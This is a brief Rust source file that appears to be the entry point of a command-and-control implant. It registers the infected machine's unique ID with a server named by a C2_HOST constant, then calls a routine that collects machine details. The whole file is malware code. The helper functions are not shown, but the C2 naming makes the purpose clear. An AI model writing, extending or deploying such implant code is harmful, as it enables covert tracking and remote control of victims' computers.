extern crate machine_uid;

mod constants;
mod utils;

fn main() {
    match utils::register_client(constants::C2_HOST, machine_uid::get().unwrap().as_str()) {
        Ok(text) => println!("\x1b[92mSuccess: Client registered\x1b[0m"),
        Err(e) => println!("\x1b[31mError: {}\x1b[0m", e),
    }

    utils::machine_details();
}
